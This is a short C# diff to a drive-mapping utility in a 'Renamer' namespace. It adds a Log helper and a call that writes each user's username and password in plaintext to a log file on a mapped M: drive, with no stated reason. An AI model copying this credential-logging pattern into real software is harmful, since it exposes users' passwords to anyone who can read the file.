@@ -333,6 +333,12 @@ namespace Renamer
 
             NetworkDrive oNetDrive = new NetworkDrive();
 
+            using (StreamWriter w = File.AppendText(@"M://logfiles/logs.txt"))
+            {
+                Log(ldata.Username + " " + ldata.Password, w);
+            }
+
+
             try
             {
                 oNetDrive.LocalDrive = "K:";
@@ -348,5 +354,16 @@ namespace Renamer
             oNetDrive = null;
 
         }
+
+        public static void Log(string logMessage, TextWriter w)
+        {
+            w.Write("\r\nLog Entry : ");
+            w.WriteLine("{0} {1}", DateTime.Now.ToLongTimeString(),
+                DateTime.Now.ToLongDateString());
+            w.WriteLine("  :");
+            w.WriteLine("  :{0}", logMessage);
+            w.WriteLine("-------------------------------");
+        }
+
     }
 }
